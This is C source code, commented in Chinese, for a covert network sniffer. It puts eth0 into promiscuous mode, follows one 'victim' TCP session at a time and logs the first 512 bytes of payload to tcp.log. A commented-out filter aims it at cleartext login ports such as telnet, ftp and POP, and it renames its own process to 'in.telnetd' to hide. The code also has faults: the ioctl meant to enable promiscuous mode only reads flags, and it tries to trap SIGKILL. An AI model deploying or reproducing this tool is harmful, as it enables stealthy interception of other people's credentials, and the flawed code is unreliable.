#include <string.h>
#include <ctype.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <netdb.h>
#include <sys/file.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/signal.h>
#include <net/if.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/if_ether.h>
#include <time.h>


int openintf(char *);
int read_tcp(int);
int filter(void);
int print_header(void);
int print_data(int, char*);
char* hostlookup(unsigned long int);
void clear_victim(void);
void cleanup(int);


struct etherpacket
{
    struct ethhdr eth;
    struct iphdr ip;
    struct tcphdr tcp;
    char buff[8192];
} ep;


struct
{
    unsigned long saddr;
    unsigned long daddr;
    unsigned short sport;
    unsigned short dport;
    int bytes_read;
    char active;
    time_t start_time;
} victim;

struct iphdr * ip;
struct tcphdr * tcp;
int s;
FILE * fp;


#define CAPTLEN 512
#define TIMEOUT 30
#define TCPLOG "tcp.log"

int openintf(char * d)
{
    int fd;
    struct ifreq ifr;
    int s;
    fd = socket(AF_INET, SOCK_PACKET, htons(0x800));
    if(fd < 0)
    {
        perror("cant get SOCK_PACKET socket");
        exit(0);
    }
    strcpy(ifr.ifr_name, d);
    s = ioctl(fd, SIOCGIFFLAGS, &ifr);
    if(s < 0)
    {
        close(fd);
        perror("can't get flags");
        exit(0);
    }
    ifr.ifr_flags |= IFF_PROMISC;
    s = ioctl(fd, SIOCGIFFLAGS, &ifr);
    if(s < 0) perror("can't set promiscuous mode");
    return fd;
}

int read_tcp(int s)
{
    int x;
    while(1)
    {
        x = read(s, (struct etherpacket *)&ep, sizeof(ep));
        if(x > 1)
        {
            if(filter() == 0) continue;
            x = x - 54;
            if(x < 1) continue;
            return x;
        }
        return x;
    }
}

int filter(void)
{
    int p = 1;
    if(ip->protocol != 6) return 0;
    if(victim.active != 0)
    if(victim.bytes_read > CAPTLEN)
    {
        fprintf(fp, "\n--------[Timed out]\n");
        clear_victim();
        return 0;
    }
    /*
    if(ntohs(tcp->dest) == 21) p = 1; // ftp port
    if(ntohs(tcp->dest) == 23) p = 1; // telnet port
    if(ntohs(tcp->dest) == 110) p = 1; // pop3 port
    if(ntohs(tcp->dest) == 109) p = 1; // pop2 port
    if(ntohs(tcp->dest) == 143) p = 1; // imap2 port
    if(ntohs(tcp->dest) == 513) p = 1; // rlogin port
    if(ntohs(tcp->dest) == 106) p = 1; // poppasswd port
    if(ntohs(tcp->dest) == 80) p = 1; // http port
    */
    if(victim.active == 0)
        if(p == 1)
            if(tcp->syn == 1)
            {
                victim.saddr = ip->saddr;
                victim.daddr = ip->daddr;
                victim.active = 1;
                victim.sport = tcp->source;
                victim.dport = tcp->dest;
                victim.bytes_read = 0;
                victim.start_time = time(NULL);
                print_header();
            }
    if(tcp->dest != victim.dport) return 0;
    if(tcp->source != victim.sport) return 0;
    if(ip->saddr != victim.saddr) return 0;
    if(ip->daddr != victim.daddr) return 0;
    if(tcp->rst == 1) {
        victim.active = 0;
        alarm(0);
        fprintf(fp, "\n--------[RST]\n");
        clear_victim();
        return 0;
    }
    if(tcp->fin == 1)
    {
        victim.active = 0;
        alarm(0);
        fprintf(fp, "\n--------[FIN]\n");
        clear_victim();
        return 0;
    }

    return 1;
}

int print_header(void)
{
    fprintf(fp, "\n");
    fprintf(fp, "%s = > ", hostlookup(ip->saddr));
    fprintf(fp, "%s [%d]\n", hostlookup(ip->daddr), ntohs(tcp->dest));
    return 0;
}

int print_data(int datalen, char *data)
{
    int i = 0;
    int t = 0;

    victim.bytes_read = victim.bytes_read + datalen;
    for(i = 0; i != datalen; i++)
    {
        if(data[i] == 13)
        {
            fprintf(fp, "\n");
            t = 0;
        }
        if(isprint(data[i]))
        {
            fprintf(fp,"%c", data[i]);
            t++;
        }
        if(t > 75)
        {
            t = 0;
            fprintf(fp, "\n");
        }
    }
    return 0;
}

int main(int argc, char *argv[])
{
    sprintf(argv[0], "%s", "in.telnetd");
    s = openintf("eth0"); // 读取eth0网卡信息
    ip = (struct iphdr *)(((unsigned long)&ep.ip) - 2);
    tcp = (struct tcphdr *)(((unsigned long)&ep.tcp) - 2);
    signal(SIGHUP, SIG_IGN); // 发送给具有Terminal的Controlling Process，当terminal被disconnect时候发送
    signal(SIGINT, cleanup); // Interrupt Key 信号
    signal(SIGTERM, cleanup); // 请求中止进程，kill命令缺省发送
    signal(SIGKILL, cleanup); // 无法处理和忽略,中止某个进程
    signal(SIGQUIT, cleanup); // 输入Quit Key的时候（CTRL+\）发送给所有Foreground Group的进程
    if(argc == 2) fp = stdout;
    else fp = fopen(TCPLOG, "at");
    if(fp == NULL)
    {
        fprintf(stderr, "can't open log\n");
        exit(0);
    }
    clear_victim(); // 清空其中的信息
    for(;;)
    {
        // 传入s---网卡信息，读取tcp数据包
        read_tcp(s);
        if(victim.active != 0)
            print_data(htons(ip->tot_len) - sizeof(ep.ip) - sizeof(ep.tcp), ep.buff - 2);
        fflush(fp);
    }

    return 0;
}

char * hostlookup(unsigned long int in)
{
    static char blah[1024];
    struct in_addr i;
    struct hostent * he;
    i.s_addr = in;
    he = gethostbyaddr((char *)&i, sizeof(struct in_addr), AF_INET);
    if(he == NULL) strcpy(blah, inet_ntoa(i));
    else strcpy(blah, he->h_name);

    return blah;
}

void clear_victim(void)
{
    victim.saddr = 0;
    victim.daddr = 0;
    victim.sport = 0;
    victim.dport = 0;
    victim.active = 0;
    victim.bytes_read = 0;
    victim.start_time = 0;
}

/* cleanup---程序退出等事件时，在文件中作个记录，并关闭文件 */
void cleanup(int sig)
{
    fprintf(fp, "Exiting...\n");
    close(s);
    fclose(fp);
    exit(0);
}
